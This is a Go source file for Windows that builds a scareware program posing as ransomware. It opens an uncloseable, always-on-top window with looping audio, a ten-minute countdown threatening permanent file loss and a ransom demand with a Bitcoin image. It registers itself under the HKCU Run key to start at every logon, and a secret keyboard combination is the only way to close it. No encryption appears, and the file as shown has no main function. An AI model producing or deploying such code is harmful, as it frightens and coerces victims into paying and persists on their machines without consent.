// Ventana persistente "Abrazo" modificada con temática creepy, bomba, contador y espacios para imágenes.
// Compilar con:  go build -ldflags "-H=windowsgui" -o abrazo_creepy.exe main.go

package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"image"
	"image/draw"
	_ "image/jpeg"
	_ "image/png"
	"os"
	"syscall"
	"time"
	"unsafe"
)

//go:embed Theme.wav
var audioData []byte

//go:embed Second_Mascot_Of_Sad_Satan-Photoroom.png
var mascotData []byte

//go:embed Bitcoin.png
var bitcoinData []byte

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")
	winmm    = syscall.NewLazyDLL("winmm.dll")

	procPlaySound = winmm.NewProc("PlaySoundW")

	procRegisterClassEx   = user32.NewProc("RegisterClassExW")
	procCreateWindowEx    = user32.NewProc("CreateWindowExW")
	procDefWindowProc     = user32.NewProc("DefWindowProcW")
	procShowWindow        = user32.NewProc("ShowWindow")
	procUpdateWindow      = user32.NewProc("UpdateWindow")
	procGetMessage        = user32.NewProc("GetMessageW")
	procTranslateMessage  = user32.NewProc("TranslateMessage")
	procDispatchMessage   = user32.NewProc("DispatchMessageW")
	procPostQuitMessage   = user32.NewProc("PostQuitMessage")
	procDestroyWindow     = user32.NewProc("DestroyWindow")
	procLoadCursor        = user32.NewProc("LoadCursorW")
	procBeginPaint        = user32.NewProc("BeginPaint")
	procEndPaint          = user32.NewProc("EndPaint")
	procDrawText          = user32.NewProc("DrawTextW")
	procGetClientRect     = user32.NewProc("GetClientRect")
	procSetWindowsHookEx  = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx    = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHook = user32.NewProc("UnhookWindowsHookEx")
	procGetAsyncKeyState  = user32.NewProc("GetAsyncKeyState")
	procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
	procInvalidateRect    = user32.NewProc("InvalidateRect")

	procGetModuleHandle = kernel32.NewProc("GetModuleHandleW")

	procCreateFont         = gdi32.NewProc("CreateFontW")
	procSelectObject       = gdi32.NewProc("SelectObject")
	procDeleteObject       = gdi32.NewProc("DeleteObject")
	procSetBkMode          = gdi32.NewProc("SetBkMode")
	procSetTextColor       = gdi32.NewProc("SetTextColor")
	procCreatePen          = gdi32.NewProc("CreatePen")
	procCreateSolidBrush   = gdi32.NewProc("CreateSolidBrush")
	procRectangle          = gdi32.NewProc("Rectangle")
	procCreateDIBSection   = gdi32.NewProc("CreateDIBSection")
	procCreateCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
	procStretchBlt         = gdi32.NewProc("StretchBlt")
	procDeleteDC           = gdi32.NewProc("DeleteDC")

	procFillRect = user32.NewProc("FillRect")

	procRegCreateKeyEx = advapi32.NewProc("RegCreateKeyExW")
	procRegSetValueEx  = advapi32.NewProc("RegSetValueExW")
	procRegCloseKey    = advapi32.NewProc("RegCloseKey")
)

const (
	WS_CAPTION     = 0x00C00000
	WS_VISIBLE     = 0x10000000
	WS_EX_TOPMOST  = 0x00000008
	SW_SHOW        = 5
	WM_DESTROY     = 0x0002
	WM_CLOSE       = 0x0010
	WM_PAINT       = 0x000F
	WM_SYSCOMMAND  = 0x0112
	DT_CENTER      = 0x00000001
	DT_VCENTER     = 0x00000004
	DT_SINGLELINE  = 0x00000020
	DT_LEFT        = 0x00000000
	TRANSPARENT    = 1
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	VK_CONTROL     = 0x11
	VK_SHIFT       = 0x10
	VK_3           = 0x33
	VK_M           = 0x4D
	VK_ENYE        = 0xBA

	HKEY_CURRENT_USER = 0x80000001
	KEY_SET_VALUE     = 0x0002
	REG_SZ            = 1

	SND_ASYNC     = 0x0001
	SND_NODEFAULT = 0x0002
	SND_MEMORY    = 0x0004
	SND_LOOP      = 0x0008
	SND_PURGE     = 0x0040
)

type WNDCLASSEX struct {
	cbSize        uint32
	style         uint32
	lpfnWndProc   uintptr
	cbClsExtra    int32
	cbWndExtra    int32
	hInstance     syscall.Handle
	hIcon         syscall.Handle
	hCursor       syscall.Handle
	hbrBackground syscall.Handle
	lpszMenuName  *uint16
	lpszClassName *uint16
	hIconSm       syscall.Handle
}

type MSG struct {
	Hwnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

type RECT struct {
	Left, Top, Right, Bottom int32
}

type PAINTSTRUCT struct {
	Hdc         syscall.Handle
	FErase      int32
	RcPaint     RECT
	FRestore    int32
	FIncUpdate  int32
	RgbReserved [32]byte
}

var (
	allowClose = false
	hookHandle uintptr
	muted      = false

	closeComboLatched = false
	muteComboLatched  = false

	countdownSeconds = 600
	animationFrame   = 0
	globalHwnd       syscall.Handle
	stopRoutine      = make(chan struct{})
)

func playLoop() {
	if len(audioData) == 0 {
		return
	}
	procPlaySound.Call(
		uintptr(unsafe.Pointer(&audioData[0])),
		0,
		uintptr(SND_ASYNC|SND_MEMORY|SND_LOOP|SND_NODEFAULT),
	)
}

func stopAudio() {
	procPlaySound.Call(0, 0, uintptr(SND_PURGE))
}

func toggleMute() {
	if muted {
		muted = false
		playLoop()
	} else {
		muted = true
		stopAudio()
	}
}

func runAbrazoWindow() {
	if len(os.Args) > 1 && os.Args[1] == "-debug" {
		runDebugMode()
		return
	}

	registerAutostart()

	className, _ := syscall.UTF16PtrFromString("VentanaCreepyClass")
	title, _ := syscall.UTF16PtrFromString("CRITICAL WARNING - ATENCIÓN")

	hInstance, _, _ := procGetModuleHandle.Call(0)

	var wc WNDCLASSEX
	wc.cbSize = uint32(unsafe.Sizeof(wc))
	wc.lpfnWndProc = syscall.NewCallback(wndProc)
	wc.hInstance = syscall.Handle(hInstance)
	wc.lpszClassName = className
	cursor, _, _ := procLoadCursor.Call(0, 32512)
	wc.hCursor = syscall.Handle(cursor)
	wc.hbrBackground = syscall.Handle(16)

	procRegisterClassEx.Call(uintptr(unsafe.Pointer(&wc)))

	screenW, _, _ := procGetSystemMetrics.Call(0)
	screenH, _, _ := procGetSystemMetrics.Call(1)

	width, height := 850, 600
	x := (int(screenW) - width) / 2
	y := (int(screenH) - height) / 2

	hwnd, _, _ := procCreateWindowEx.Call(
		uintptr(WS_EX_TOPMOST),
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(title)),
		uintptr(WS_CAPTION|WS_VISIBLE),
		uintptr(x), uintptr(y),
		uintptr(width), uintptr(height),
		0, 0, hInstance, 0,
	)

	globalHwnd = syscall.Handle(hwnd)

	procShowWindow.Call(hwnd, SW_SHOW)
	procUpdateWindow.Call(hwnd)

	playLoop()

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if countdownSeconds > 0 {
					countdownSeconds--
				}
				animationFrame = (animationFrame + 1) % 2
				if globalHwnd != 0 {
					procInvalidateRect.Call(uintptr(globalHwnd), 0, 0)
				}
			case <-stopRoutine:
				return
			}
		}
	}()

	hookHandle, _, _ = procSetWindowsHookEx.Call(
		uintptr(WH_KEYBOARD_LL),
		syscall.NewCallback(keyboardHookProc),
		hInstance,
		0,
	)

	var msg MSG
	for {
		ret, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}

	close(stopRoutine)
	procUnhookWindowsHook.Call(hookHandle)
}

func wndProc(hwnd syscall.Handle, msg uint32, wParam, lParam uintptr) uintptr {
	switch msg {
	case WM_CLOSE:
		if allowClose {
			procDestroyWindow.Call(uintptr(hwnd))
		}
		return 0
	case WM_SYSCOMMAND:
		if (wParam & 0xFFF0) == 0xF060 {
			return 0
		}
		r, _, _ := procDefWindowProc.Call(uintptr(hwnd), uintptr(msg), wParam, lParam)
		return r
	case WM_DESTROY:
		procPostQuitMessage.Call(0)
		return 0
	case WM_PAINT:
		paint(hwnd)
		return 0
	}
	r, _, _ := procDefWindowProc.Call(uintptr(hwnd), uintptr(msg), wParam, lParam)
	return r
}

func paint(hwnd syscall.Handle) {
	var ps PAINTSTRUCT
	hdc, _, _ := procBeginPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))

	var rect RECT
	procGetClientRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&rect)))

	blackBrush, _, _ := procCreateSolidBrush.Call(0x000000)
	procFillRect.Call(hdc, uintptr(unsafe.Pointer(&rect)), blackBrush)
	procDeleteObject.Call(blackBrush)

	procSetBkMode.Call(hdc, TRANSPARENT)

	// 1. BOMBA Y CONTADOR
	bombFont, _, _ := procCreateFont.Call(
		uintptr(18), 0, 0, 0, uintptr(700), 0, 0, 0,
		1, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(strPtr("Consolas"))),
	)
	oldFont, _, _ := procSelectObject.Call(hdc, bombFont)

	procSetTextColor.Call(hdc, 0x000000FF)
	bombRect := RECT{20, 30, 220, 140}

	var bombArt *uint16
	if animationFrame == 0 {
		bombArt, _ = syscall.UTF16PtrFromString("   (  ) \n    )( \n   (____)\n  Si el contador llega a 0, tus archivos\nse perderán PARA SIEMPRE")
	} else {
		bombArt, _ = syscall.UTF16PtrFromString("   (( )) \n    )( \n   (****)\n  Si el contador llega a 0, tus archivos\nse perderán para siempre")
	}
	procDrawText.Call(hdc, uintptr(unsafe.Pointer(bombArt)), ^uintptr(0), uintptr(unsafe.Pointer(&bombRect)), uintptr(DT_CENTER))

	mins := countdownSeconds / 60
	secs := countdownSeconds % 60
	timerStr := fmt.Sprintf("00:%02d:%02d", mins, secs)
	timerText, _ := syscall.UTF16PtrFromString(timerStr)
	timerRect := RECT{20, 150, 220, 190}

	timerFont, _, _ := procCreateFont.Call(
		uintptr(24), 0, 0, 0, uintptr(800), 0, 0, 0,
		1, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(strPtr("Consolas"))),
	)
	procSelectObject.Call(hdc, timerFont)
	procSetTextColor.Call(hdc, 0x0000FFFF)
	procDrawText.Call(hdc, uintptr(unsafe.Pointer(timerText)), ^uintptr(0), uintptr(unsafe.Pointer(&timerRect)), uintptr(DT_CENTER))
	procDeleteObject.Call(timerFont)

	procSelectObject.Call(hdc, oldFont)
	procDeleteObject.Call(bombFont)

	// 2. TEXTO CREEPY PRINCIPAL
	titleFont, _, _ := procCreateFont.Call(
		uintptr(22), 0, 0, 0, uintptr(800), 0, 0, 0,
		1, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(strPtr("Impact"))),
	)
	procSelectObject.Call(hdc, titleFont)
	procSetTextColor.Call(hdc, 0x000000EE)

	titleRect := RECT{250, 30, 820, 100}
	titleText, _ := syscall.UTF16PtrFromString("¡TUS ARCHIVOS HAN SIDO SECUESTRADOS POR ALECS Y JUANO!")
	procDrawText.Call(hdc, uintptr(unsafe.Pointer(titleText)), ^uintptr(0), uintptr(unsafe.Pointer(&titleRect)), uintptr(DT_CENTER|DT_VCENTER|DT_SINGLELINE))
	procDeleteObject.Call(titleFont)

	subFont, _, _ := procCreateFont.Call(
		uintptr(15), 0, 0, 0, uintptr(400), 0, 0, 0,
		1, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(strPtr("Consolas"))),
	)
	procSelectObject.Call(hdc, subFont)
	procSetTextColor.Call(hdc, 0x00CCCCCC)

	subRect := RECT{250, 110, 820, 190}
	subText, _ := syscall.UTF16PtrFromString("No hay salida. Paga el rescate o pierdelo todo para siempre.\nCada segundo que pasa te acerca al olvido total.\nTe hemos dejado las instrucciones en tu escrotorio ")
	procDrawText.Call(hdc, uintptr(unsafe.Pointer(subText)), ^uintptr(0), uintptr(unsafe.Pointer(&subRect)), uintptr(DT_CENTER))
	procDeleteObject.Call(subFont)

	// 3. ESPACIOS Y RENDERIZADO DE LAS IMÁGENES
	boxPen, _, _ := procCreatePen.Call(0, 2, 0x000000EE)
	oldPen, _, _ := procSelectObject.Call(hdc, boxPen)

	img1Rect := RECT{50, 230, 410, 530}
	procRectangle.Call(hdc, uintptr(img1Rect.Left), uintptr(img1Rect.Top), uintptr(img1Rect.Right), uintptr(img1Rect.Bottom))

	img2Rect := RECT{440, 230, 800, 530}
	procRectangle.Call(hdc, uintptr(img2Rect.Left), uintptr(img2Rect.Top), uintptr(img2Rect.Right), uintptr(img2Rect.Bottom))

	procSelectObject.Call(hdc, oldPen)
	procDeleteObject.Call(boxPen)

	// Dibujar las imágenes directamente desde la memoria incrustada (dentro de paint)
	drawWinImageFromBytes(syscall.Handle(hdc), mascotData, img1Rect)
	drawWinImageFromBytes(syscall.Handle(hdc), bitcoinData, img2Rect)

	procEndPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))
}

func drawWinImageFromBytes(hdc syscall.Handle, data []byte, rect RECT) {
	if len(data) == 0 {
		return
	}

	img, _, err := image.Decode(bytes.NewReader(data))
	if err != nil {
		return // Evita que un fallo en la imagen tire la ventana entera
	}

	bounds := img.Bounds()
	dx := bounds.Dx()
	dy := bounds.Dy()

	rgba := image.NewRGBA(bounds)
	draw.Draw(rgba, bounds, img, bounds.Min, draw.Src)

	bmi := struct {
		BiSize          uint32
		BiWidth         int32
		BiHeight        int32
		BiPlanes        uint16
		BiBitCount      uint16
		BiCompression   uint32
		BiSizeImage     uint32
		BiXPelsPerMeter int32
		BiYPelsPerMeter int32
		BiClrUsed       uint32
		BiClrImportant  uint32
	}{
		BiSize:        40,
		BiWidth:       int32(dx),
		BiHeight:      int32(-dy),
		BiPlanes:      1,
		BiBitCount:    32,
		BiCompression: 0,
	}

	var bits *byte
	hBitmap, _, _ := procCreateDIBSection.Call(
		0,
		uintptr(unsafe.Pointer(&bmi)),
		0,
		uintptr(unsafe.Pointer(&bits)),
		0,
		0,
	)
	if hBitmap == 0 {
		return
	}
	defer procDeleteObject.Call(hBitmap)

	srcBytes := rgba.Pix
	if len(srcBytes) > 0 && bits != nil {
		osBits := (*[1 << 30]byte)(unsafe.Pointer(bits))[:len(srcBytes):len(srcBytes)]
		copy(osBits, srcBytes)
	}

	memDC, _, _ := procCreateCompatibleDC.Call(uintptr(hdc))
	if memDC == 0 {
		return
	}
	defer procDeleteDC.Call(memDC)

	oldObj, _, _ := procSelectObject.Call(memDC, hBitmap)
	defer procSelectObject.Call(memDC, oldObj)

	targetWidth := rect.Right - rect.Left - 4
	targetHeight := rect.Bottom - rect.Top - 4

	procStretchBlt.Call(
		uintptr(hdc),
		uintptr(rect.Left+2), uintptr(rect.Top+2),
		uintptr(targetWidth), uintptr(targetHeight),
		memDC,
		0, 0,
		uintptr(dx), uintptr(dy),
		0x00CC0020,
	)
}

func strPtr(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}

func keyboardHookProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && wParam == WM_KEYDOWN {
		ctrlDown := isKeyDown(VK_CONTROL)
		shiftDown := isKeyDown(VK_SHIFT)
		enyeDown := isKeyDown(VK_ENYE)
		threeDown := isKeyDown(VK_3)
		mDown := isKeyDown(VK_M)

		closeCombo := ctrlDown && shiftDown && enyeDown && threeDown
		muteCombo := ctrlDown && shiftDown && mDown && !enyeDown && !threeDown

		if closeCombo && !closeComboLatched {
			closeComboLatched = true
			allowClose = true
			stopAudio()
			procPostQuitMessage.Call(0)
		}
		if !closeCombo {
			closeComboLatched = false
		}

		if muteCombo && !muteComboLatched {
			muteComboLatched = true
			toggleMute()
		}
		if !muteCombo {
			muteComboLatched = false
		}
	}
	r, _, _ := procCallNextHookEx.Call(hookHandle, uintptr(nCode), wParam, lParam)
	return r
}

func isKeyDown(vk int) bool {
	state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return state&0x8000 != 0
}

func registerAutostart() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	var hKey syscall.Handle
	ret, _, _ := procRegCreateKeyEx.Call(
		uintptr(HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(subKey)),
		0, 0, 0,
		uintptr(KEY_SET_VALUE),
		0,
		uintptr(unsafe.Pointer(&hKey)),
		0,
	)
	if ret != 0 {
		return
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valueName, _ := syscall.UTF16PtrFromString("VentanaAbrazo")
	pathUTF16, _ := syscall.UTF16PtrFromString(exePath)
	pathBytes := (*[1 << 20]byte)(unsafe.Pointer(pathUTF16))[: (len(exePath)+1)*2 : (len(exePath)+1)*2]

	procRegSetValueEx.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(REG_SZ),
		uintptr(unsafe.Pointer(&pathBytes[0])),
		uintptr(len(pathBytes)),
	)
}

func runDebugMode() {
	fmt.Println("Modo debug activado")
}